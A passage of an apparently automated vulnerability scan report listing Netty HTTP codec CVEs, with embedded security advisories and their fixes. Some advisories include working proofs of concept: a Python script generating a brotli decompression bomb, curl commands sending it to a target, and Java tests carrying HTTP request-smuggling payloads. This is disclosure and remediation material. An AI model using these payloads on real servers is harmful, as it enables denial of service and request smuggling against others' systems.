│     │      │                   The same vulnerability exists in `DelegatingDecompressorFrameListener` for
│     │      │                   HTTP/2 connections.
│     │      │                   ## Details
│     │      │                   `HttpContentDecompressor` stores the `maxAllocation` value at construction
│     │      │                   time (`HttpContentDecompressor.java:89`) and uses it in `newContentDecoder()`
│     │      │                   to create the appropriate decompression handler.
│     │      │                   For gzip/deflate, `maxAllocation` is forwarded to
│     │      │                   `ZlibCodecFactory.newZlibDecoder()`:
│     │      │                   ```java
│     │      │                   // HttpContentDecompressor.java:101 — maxAllocation IS enforced
│     │      │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP, maxAllocation))
│     │      │                   ```
│     │      │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a hard cap by setting
│     │      │                    the buffer's `maxCapacity` and throwing `DecompressionException` when the
│     │      │                   limit is reached:
│     │      │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
│     │      │                   return ctx.alloc().heapBuffer(Math.min(preferredSize, maxAllocation),
│     │      │                   maxAllocation);
│     │      │                   // ZlibDecoder.java:80 — throws when exceeded
│     │      │                   throw new DecompressionException("Decompression buffer has reached maximum
│     │      │                   size: " + buffer.maxCapacity());
│     │      │                   For brotli, zstd, and snappy, the decoders are created without any size
│     │      │                   limit:
│     │      │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
│     │      │                   .handlers(new BrotliDecoder())
│     │      │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
│     │      │                   .handlers(new SnappyFrameDecoder())
│     │      │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
│     │      │                   .handlers(new ZstdDecoder())
│     │      │                   `BrotliDecoder` has no `maxAllocation` parameter at all — there is no way to
│     │      │                   constrain its output. It streams decompressed data in chunks via
│     │      │                   `fireChannelRead` with no total limit.
│     │      │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`, but this only
│     │      │                   constrains individual buffer allocations, not total output. The decode loop
│     │      │                   (`ZstdDecoder.java:100-114`) creates new buffers and fires `channelRead`
│     │      │                   repeatedly, so total decompressed output is unbounded.
│     │      │                   The identical pattern exists in
│     │      │                   `DelegatingDecompressorFrameListener.newContentDecompressor()` at lines
│     │      │                   188-210 for HTTP/2.
│     │      │                   ## PoC
│     │      │                   1. Configure a Netty HTTP server with decompression bomb protection:
│     │      │                   pipeline.addLast(new HttpContentDecompressor(1048576)); // 1MB max
│     │      │                   pipeline.addLast(new HttpObjectAggregator(1048576));     // 1MB max
│     │      │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB decompressed):
│     │      │                   ```python
│     │      │                   import brotli
│     │      │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
│     │      │                   compressed = brotli.compress(bomb, quality=11)
│     │      │                   with open('bomb.br', 'wb') as f:
│     │      │                       f.write(compressed)
│     │      │                   # compressed size: ~1KB
│     │      │                   3. Send the bomb with gzip encoding (BLOCKED by maxAllocation):
│     │      │                   ```bash
│     │      │                   # This is caught — ZlibDecoder enforces the 1MB limit
│     │      │                   curl -X POST http://target:8080/api \
│     │      │                     -H 'Content-Encoding: gzip' \
│     │      │                     --data-binary @bomb.gz
│     │      │                   # Result: DecompressionException thrown at 1MB
│     │      │                   4. Send the same bomb with brotli encoding (BYPASSES maxAllocation):
│     │      │                   # This bypasses the limit — BrotliDecoder has no maxAllocation
│     │      │                     -H 'Content-Encoding: br' \
│     │      │                     --data-binary @bomb.br
│     │      │                   # Result: Full 1GB decompressed into memory → OOM
│     │      │                   5. The same bypass works with `Content-Encoding: zstd` and `Content-Encoding:
│     │      │                   snappy`.
│     │      │                   ## Impact
│     │      │                   - **Denial of Service**: An attacker can cause out-of-memory conditions on any
│     │      │                    Netty server that relies on `maxAllocation` for decompression bomb
│     │      │                   protection, by simply using a non-gzip content encoding.
│     │      │                   - **False sense of security**: Developers who explicitly configure
│     │      │                   `maxAllocation` to protect against decompression bombs are not actually
│     │      │                   protected for brotli, zstd, or snappy encodings. The API documentation implies
│     │      │                    all encodings are covered.
│     │      │                   - **Trivial bypass**: The attacker only needs to change one HTTP header
│     │      │                   (`Content-Encoding: br` instead of `Content-Encoding: gzip`) to circumvent the
│     │      │                    protection entirely.
│     │      │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in both
│     │      │                   `HttpContentDecompressor` (HTTP/1.1) and `DelegatingDecompressorFrameListener`
│     │      │                    (HTTP/2).
│     │      │                   ## Recommended Fix
│     │      │                   Pass `maxAllocation` to all decoder constructors. For `BrotliDecoder`, which
│     │      │                   currently has no `maxAllocation` support, add the parameter:
│     │      │                   **HttpContentDecompressor.java** — pass maxAllocation to all decoders:
│     │      │                   // Line 120: BrotliDecoder — add maxAllocation support
│     │      │                   .handlers(new BrotliDecoder(maxAllocation))
│     │      │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
│     │      │                   .handlers(new SnappyFrameDecoder(maxAllocation))
│     │      │                   // Line 138: ZstdDecoder — forward the configured maxAllocation
│     │      │                   .handlers(new ZstdDecoder(maxAllocation))
│     │      │                   **DelegatingDecompressorFrameListener.java** — same fix at lines 188-210.
│     │      │                   **BrotliDecoder** — add `maxAllocation` parameter with the same semantics as
│     │      │                   `ZlibDecoder.prepareDecompressBuffer()`: set buffer maxCapacity and throw
│     │      │                   `DecompressionException` when the total decompressed output exceeds the
│     │      │                   limit.
│     │      │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with equivalent
│     │      │                   enforcement.
│     │      │                   **ZstdDecoder** — ensure that when `maxAllocation` is set, total output across
│     │      │                    all buffers is bounded (not just per-buffer allocation size). 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA-f6hv-jmp6-3vwv 
│     ├ [4]  ╭ VulnerabilityID : CVE-2026-41417 
│     │      ├ VendorIDs        ─ [0]: GHSA-v8h7-rr48-vmmv 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
│     │      │                  ╰ UID : 42139b2b89dda2f4 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41417 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:93d4d183ea24c9ac4669c676a37a4d257c3c8c85614591f870f0fbd4722554a5 
│     │      ├ Title           : Netty allows request-line validation to be bypassed when a `DefaultHtt ... 
│     │      ├ Description     : Netty allows request-line validation to be bypassed when a
│     │      │                   `DefaultHttpRequest` or `DefaultFullHttpRequest` is created first and its URI
│     │      │                   is later changed via `setUri()`. The constructors reject CRLF and whitespace
│     │      │                   characters that would break the start-line, but `setUri()` does not apply the
│     │      │                   same validation. `HttpRequestEncoder` and `RtspEncoder` then write the URI
│     │      │                   into the request line verbatim. If attacker-controlled input reaches
│     │      │                   `setUri()`, this enables CRLF injection and insertion of additional HTTP or
│     │      │                   RTSP requests, leading to HTTP request smuggling or desynchronization on the
│     │      │                   HTTP side and request injection on the RTSP side. This issue is fixed in
│     │      │                   versions 4.2.13.Final and 4.1.133.Final. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ╭ [0]: CWE-93 
│     │      │                  ╰ [1]: CWE-444 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│     │      │                         ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://github.com/netty/netty 
│     │      │                  ├ [1]: https://github.com/netty/netty/security/advisories/GHSA-v8h7-rr48-vmmv 
│     │      │                  ╰ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-41417 
│     │      ├ PublishedDate   : 2026-05-06T22:16:25.78Z 
│     │      ╰ LastModifiedDate: 2026-05-07T15:16:06.703Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2026-42580 
│     │      ├ VendorIDs        ─ [0]: GHSA-m4cv-j2px-7723 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
│     │      │                  ╰ UID : 42139b2b89dda2f4 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42580 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:a5f622b790a6601a3a144d72bb18c6a88034dc4dada60d5a3bdcdd612c260fe1 
│     │      ├ Title           : Netty vulnerable to HTTP Request Smuggling due to incorrect chunk size parsing 
│     │      ├ Description     : ### Summary
│     │      │                   Netty's chunk size parser silently overflows int, enabling request smuggling
│     │      │                   attacks.
│     │      │                   
│     │      │                   ### Details
│     │      │                   io.netty.handler.codec.http.HttpObjectDecoder#getChunkSize silently overflows
│     │      │                   int.
│     │      │                   The size is accumulated as follows:
│     │      │                   result *= 16;
│     │      │                   result += digit;
│     │      │                   The result is checked only for negative values. However, with a carefully
│     │      │                   crafted chunk size, the result can be a valid size.
│     │      │                   ### PoC
│     │      │                   The test below shows Netty successfully parsing the second request,
│     │      │                   demonstrating how an attacker can smuggle a second request inside a chunked
│     │      │                   body.
│     │      │                   ```java
│     │      │                   @Test
│     │      │                   public void test() {
│     │      │                       String requestStr = "POST / HTTP/1.1\r\n" +
│     │      │                               "Host: localhost\r\n" +
│     │      │                               "Transfer-Encoding: chunked\r\n\r\n" +
│     │      │                               "100000004\r\n" +
│     │      │                               "test\r\n" +
│     │      │                               "0\r\n" +
│     │      │                               "\r\n" +
│     │      │                               "GET /smuggled HTTP/1.1\r\n" +
│     │      │                               "Content-Length: 0\r\n" +
│     │      │                               "\r\n";
│     │      │                       EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
│     │      │                       assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr,
│     │      │                   CharsetUtil.US_ASCII)));
│     │      │                       // Request 1
│     │      │                       HttpRequest request = channel.readInbound();
│     │      │                       assertTrue(request.decoderResult().isSuccess());
│     │      │                       HttpContent content = channel.readInbound();
│     │      │                       assertTrue(content.decoderResult().isSuccess());
│     │      │                       assertEquals("test", content.content().toString(CharsetUtil.US_ASCII));
│     │      │                       content.release();
│     │      │                       LastHttpContent last = channel.readInbound();
│     │      │                       assertTrue(last.decoderResult().isSuccess());
│     │      │                       last.release();
│     │      │                       // Request 2
│     │      │                       request = channel.readInbound();
│     │      │                       last = channel.readInbound();
│     │      │                   }
│     │      │                   ```
│     │      │                   ### Impact
│     │      │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP requests 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L 
│     │      │                         ╰ V3Score : 6.5 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA-m4cv-j2px-7723 
│     ├ [6]  ╭ VulnerabilityID : CVE-2026-42581 
│     │      ├ VendorIDs        ─ [0]: GHSA-xxqh-mfjm-7mv9 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
│     │      │                  ╰ UID : 42139b2b89dda2f4 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42581 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:58bc9ea42646dc9d7d171634deae867d9e708fc78a3b3c40243c810f005653a7 
│     │      ├ Title           : Netty HTTP/1.0 TE+CL Coexistence Bypasses Smuggling Sanitization 
│     │      ├ Description     : # NETTY HTTP/1.0 TE+CL Coexistence Bypasses Smuggling Sanitization
│     │      │                   
│     │      │                   | Field     | Value |
│     │      │                   |-----------|-------|
│     │      │                   | Library   | `io.netty:netty-codec-http` |
│     │      │                   | Component | `codec-http` — `HttpObjectDecoder` |
│     │      │                   | Severity  | **HIGH** |
│     │      │                   | Affects   | HEAD, commit `4f3533ae` confirmed |
│     │      │                   ---
│     │      │                   ## Summary
│     │      │                   `HttpObjectDecoder` strips a conflicting `Content-Length` header when a
│     │      │                   request carries both `Transfer-Encoding: chunked` and `Content-Length`, but
│     │      │                   only for HTTP/1.1 messages. The guard is absent for HTTP/1.0. An attacker that
│     │      │                    sends an HTTP/1.0 request with both headers causes Netty to decode the body
│     │      │                   as chunked while leaving `Content-Length` intact in the forwarded
│     │      │                   `HttpMessage`. Any downstream proxy or handler that trusts `Content-Length`
│     │      │                   over `Transfer-Encoding` will disagree on message boundaries, enabling request
│     │      │                    smuggling.
│     │      │                   ## Root Cause
│     │      │                   ```java
│     │      │                   // HttpObjectDecoder.java:828-833
│     │      │                   if (HttpUtil.isTransferEncodingChunked(message)) {
│     │      │                       this.chunked = true;
│     │      │                       if (!contentLengthFields.isEmpty() && message.protocolVersion() ==
│     │      │                   HttpVersion.HTTP_1_1) {
│     │      │                           handleTransferEncodingChunkedWithContentLength(message);  // strips CL
│     │      │                    — HTTP/1.1 only
│     │      │                       }
│     │      │                       return State.READ_CHUNK_SIZE;
│     │      │                   }
│     │      │                   // HttpObjectDecoder.java:870-873
│     │      │                   protected void handleTransferEncodingChunkedWithContentLength(HttpMessage
│     │      │                   message) {
│     │      │                       message.headers().remove(HttpHeaderNames.CONTENT_LENGTH);
│     │      │                       contentLength = Long.MIN_VALUE;
│     │      │                   ```
│     │      │                   The conflict-resolution path is gated on `message.protocolVersion() ==
│     │      │                   HttpVersion.HTTP_1_1`. When the request declares `HTTP/1.0`, the condition is
│     │      │                   false, `handleTransferEncodingChunkedWithContentLength` is never called, and
│     │      │                   the `Content-Length` header survives into the forwarded message. Netty still
│     │      │                   processes the body as chunked; a downstream component that is CL-first
│     │      │                   interprets the same bytes as a separate request.
│     │      │                   ## Proof of Concept
│     │      │                   POST /api HTTP/1.0\r\n
│     │      │                   Host: internal.example.com\r\n
│     │      │                   Transfer-Encoding: chunked\r\n
│     │      │                   Content-Length: 0\r\n
│     │      │                   \r\n
│     │      │                   5\r\n
│     │      │                   GPOST\r\n
│     │      │                   0\r\n
│     │      │                   Netty consumes the full chunked body (5 bytes + terminator). A downstream
│     │      │                   CL-first proxy reads `Content-Length: 0`, considers the request complete at
│     │      │                   the blank line, and treats `5\r\nGPOST\r\n0\r\n\r\n` as the start of a second
│     │      │                   request.
│     │      │                   ## Conditions Required
│     │      │                   1. Netty is deployed behind a reverse proxy or load balancer that is
│     │      │                   `Content-Length`-first (nginx, some HAProxy configs, AWS ALB in certain
│     │      │                   modes).
│     │      │                   2. Attacker can send HTTP/1.0 requests (either directly or by downgrading via
│     │      │                   connection manipulation).
│     │      │                   3. No additional HTTP/1.0 stripping layer between attacker and Netty.
│     │      │                   ## Impact
│     │      │                   Request smuggling at the Netty edge. Allows cache poisoning, session fixation
│     │      │                   against other users, unauthorized access to internal endpoints, and bypassing
│     │      │                   of WAF or authentication layers that inspect only the first logical request.
│     │      │                   ## Confirmed PoC Test
│     │      │                   Verified against HEAD (`4f3533ae`) using `EmbeddedChannel`. Both tests pass,
│     │      │                   confirming the vulnerability and the HTTP/1.1 contrast.
│     │      │                   package io.netty.handler.codec.http;
│     │      │                   import io.netty.buffer.Unpooled;
│     │      │                   import io.netty.channel.embedded.EmbeddedChannel;
│     │      │                   import io.netty.util.CharsetUtil;
│     │      │                   import org.junit.jupiter.api.Test;
│     │      │                   import static org.junit.jupiter.api.Assertions.*;
│     │      │                   public class NettySmugglingSec001Test {
│     │      │                       // VULNERABLE: Content-Length survives in HTTP/1.0 TE+CL conflict
│     │      │                       @Test
│     │      │                       public void http10_contentLengthNotStripped() {
│     │      │                           EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestDecoder());
│     │      │                           ch.writeInbound(Unpooled.copiedBuffer(
│     │      │                                   "POST /api HTTP/1.0\r\n" +
│     │      │                                   "Transfer-Encoding: chunked\r\n" +
│     │      │                                   "Content-Length: 0\r\n" +
│     │      │                                   "\r\n" +
│     │      │                                   "5\r\nGPOST\r\n0\r\n\r\n", CharsetUtil.US_ASCII));
│     │      │                           HttpRequest req = ch.readInbound();
│     │      │                           assertEquals(HttpVersion.HTTP_1_0, req.protocolVersion());
│     │      │                           // Content-Length: 0 survives — downstream CL-first proxy treats
│     │      │                   chunked body as new request
│     │      │                           assertNotNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH),
│     │      │                   "VULNERABLE: CL not stripped");
│     │      │                           ch.finishAndReleaseAll();
│     │      │                       // SAFE: HTTP/1.1 correctly strips Content-Length on TE+CL conflict
│     │      │                       public void http11_contentLengthStripped() {
│     │      │                                   "POST /api HTTP/1.1\r\n" +
│     │      │                           assertNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH), "SAFE:
│     │      │                   CL correctly stripped");
│     │      │                   ## Fix Guidance
│     │      │                   Remove the `message.protocolVersion() == HttpVersion.HTTP_1_1` guard in
│     │      │                   `HttpObjectDecoder`, applying `handleTransferEncodingChunkedWithContentLength`
│     │      │                    unconditionally whenever both `Transfer-Encoding: chunked` and
│     │      │                   `Content-Length` are present, regardless of protocol version. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N 
│     │      │                         ╰ V3Score : 5.8 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA-xxqh-mfjm-7mv9 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-42585 
│     │      ├ VendorIDs        ─ [0]: GHSA-38f8-5428-x5cv 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
│     │      │                  ╰ UID : 42139b2b89dda2f4 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42585 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:53d4285472677848c962416ebde636d0cac2a1fb6b5cc0384caf7eb172151863 
│     │      ├ Title           : Netty vulnerable to HTTP Request Smuggling due to malformed Transfer-Encoding 
│     │      ├ Description     : ### Summary
│     │      │                   Netty incorrectly parses malformed Transfer-Encoding, enabling request
│     │      │                   smuggling attacks.
│     │      │                   
│     │      │                   ### Details
│     │      │                   Netty incorrectly marks a request as chunked when malformed
│     │      │                   "Transfer-Encoding: chunked, identity" is present.
│     │      │                   According to RFC
│     │      │                   https://datatracker.ietf.org/doc/html/rfc9112#name-message-body-length
│     │      │                   "
│     │      │                   If a Transfer-Encoding header field is present in a request and the chunked
│     │      │                   transfer coding is not the final encoding,
│     │      │                    the message body length cannot be determined reliably; the server MUST
│     │      │                   respond with the 400 (Bad Request)
│     │      │                    status code and then close the connection.
│     │      │                   A possible scenario is when Netty is behind a proxy that doesn't reject
│     │      │                   requests with "Transfer-Encoding: chunked, identity", but prefers
│     │      │                   "Content-Length" and forwards the content to Netty.
│     │      │                   ### PoC
│     │      │                   The test below shows Netty successfully parsing the second request,
│     │      │                   demonstrating how an attacker can smuggle a second request inside a request
│     │      │                   body.
│     │      │                   ```java
│     │      │                   @Test
│     │      │                       public void test() {
│     │      │                           String requestStr = "POST / HTTP/1.1\r\n" +
│     │      │                                   "Host: localhost\r\n" +
│     │      │                                   "Transfer-Encoding: chunked, identity\r\n" +
│     │      │                                   "Content-Length: 48\r\n" +
│     │      │                                   "\r\n" +
│     │      │                                   "0\r\n" +
│     │      │                                   "GET /smuggled HTTP/1.1\r\n" +
│     │      │                                   "\r\n";
│     │      │                           EmbeddedChannel channel = new EmbeddedChannel(new
│     │      │                   HttpRequestDecoder());
│     │      │                           assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr,
│     │      │                   CharsetUtil.US_ASCII)));
│     │      │                           // Request 1
│     │      │                           HttpRequest request = channel.readInbound();
│     │      │                           assertTrue(request.decoderResult().isSuccess());
│     │      │                           assertTrue(request.headers().contains("Transfer-Encoding"));
│     │      │                           assertFalse(request.headers().contains("Content-Length"));
│     │      │                           LastHttpContent last = channel.readInbound();
│     │      │                           assertTrue(last.decoderResult().isSuccess());
│     │      │                           last.release();
│     │      │                           // Request 2
│     │      │                           request = channel.readInbound();
│     │      │                           last = channel.readInbound();
│     │      │                       }
│     │      │                   ```
│     │      │                   ### Impact
│     │      │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP requests 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
│     │      │                         ╰ V3Score : 6.5 
│     │      ╰ References       ╭ [0]: https://datatracker.ietf.org/doc/html/rfc9112#name-message-body-length 
│     │                         ├ [1]: https://github.com/netty/netty 
│     │                         ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA-38f8-5428-x5cv 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-42587 
│     │      ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
│     │      ├ PkgName         : io.netty:netty-codec-http2 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.12.Final 
│     │      │                  ╰ UID : c9374114bd085c75 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:1bb46d795a7497b13b63d4a8826de74e12cf486b9e15e9a38d14f8e430e52f9e 
│     │      ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when Content-Encoding set
│     │      │                   to br/zstd/snappy leads to decompression bomb DoS 
│     │      ├ Description     : ## Summary
│     │      │                   
│     │      │                   `HttpContentDecompressor` accepts a `maxAllocation` parameter to limit
│     │      │                   decompression buffer size and prevent decompression bomb attacks. This limit
│     │      │                   is correctly enforced for gzip and deflate encodings via `ZlibDecoder`, but is
│     │      │                    silently ignored when the content encoding is `br` (Brotli), `zstd`, or
│     │      │                   `snappy`. An attacker can bypass the configured decompression limit by sending
│     │      │                    a compressed payload with `Content-Encoding: br` instead of
│     │      │                   `Content-Encoding: gzip`, causing unbounded memory allocation and
│     │      │                   out-of-memory denial of service.
│     │      │                   The same vulnerability exists in `DelegatingDecompressorFrameListener` for
│     │      │                   HTTP/2 connections.
│     │      │                   ## Details
│     │      │                   `HttpContentDecompressor` stores the `maxAllocation` value at construction
│     │      │                   time (`HttpContentDecompressor.java:89`) and uses it in `newContentDecoder()`
│     │      │                   to create the appropriate decompression handler.
│     │      │                   For gzip/deflate, `maxAllocation` is forwarded to
│     │      │                   `ZlibCodecFactory.newZlibDecoder()`:
│     │      │                   ```java
│     │      │                   // HttpContentDecompressor.java:101 — maxAllocation IS enforced
│     │      │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP, maxAllocation))
│     │      │                   ```
│     │      │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a hard cap by setting
│     │      │                    the buffer's `maxCapacity` and throwing `DecompressionException` when the
│     │      │                   limit is reached:
│     │      │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
│     │      │                   return ctx.alloc().heapBuffer(Math.min(preferredSize, maxAllocation),
│     │      │                   maxAllocation);
│     │      │                   // ZlibDecoder.java:80 — throws when exceeded
│     │      │                   throw new DecompressionException("Decompression buffer has reached maximum
│     │      │                   size: " + buffer.maxCapacity());
│     │      │                   For brotli, zstd, and snappy, the decoders are created without any size
│     │      │                   limit:
│     │      │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
│     │      │                   .handlers(new BrotliDecoder())
│     │      │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
│     │      │                   .handlers(new SnappyFrameDecoder())
│     │      │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
│     │      │                   .handlers(new ZstdDecoder())
│     │      │                   `BrotliDecoder` has no `maxAllocation` parameter at all — there is no way to
│     │      │                   constrain its output. It streams decompressed data in chunks via
│     │      │                   `fireChannelRead` with no total limit.
│     │      │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`, but this only
│     │      │                   constrains individual buffer allocations, not total output. The decode loop
│     │      │                   (`ZstdDecoder.java:100-114`) creates new buffers and fires `channelRead`
│     │      │                   repeatedly, so total decompressed output is unbounded.
│     │      │                   The identical pattern exists in
│     │      │                   `DelegatingDecompressorFrameListener.newContentDecompressor()` at lines
│     │      │                   188-210 for HTTP/2.
│     │      │                   ## PoC
│     │      │                   1. Configure a Netty HTTP server with decompression bomb protection:
│     │      │                   pipeline.addLast(new HttpContentDecompressor(1048576)); // 1MB max
│     │      │                   pipeline.addLast(new HttpObjectAggregator(1048576));     // 1MB max
│     │      │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB decompressed):
│     │      │                   ```python
│     │      │                   import brotli
│     │      │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
│     │      │                   compressed = brotli.compress(bomb, quality=11)
│     │      │                   with open('bomb.br', 'wb') as f:
│     │      │                       f.write(compressed)
│     │      │                   # compressed size: ~1KB
│     │      │                   3. Send the bomb with gzip encoding (BLOCKED by maxAllocation):
│     │      │                   ```bash
│     │      │                   # This is caught — ZlibDecoder enforces the 1MB limit
│     │      │                   curl -X POST http://target:8080/api \
│     │      │                     -H 'Content-Encoding: gzip' \
│     │      │                     --data-binary @bomb.gz
│     │      │                   # Result: DecompressionException thrown at 1MB
│     │      │                   4. Send the same bomb with brotli encoding (BYPASSES maxAllocation):
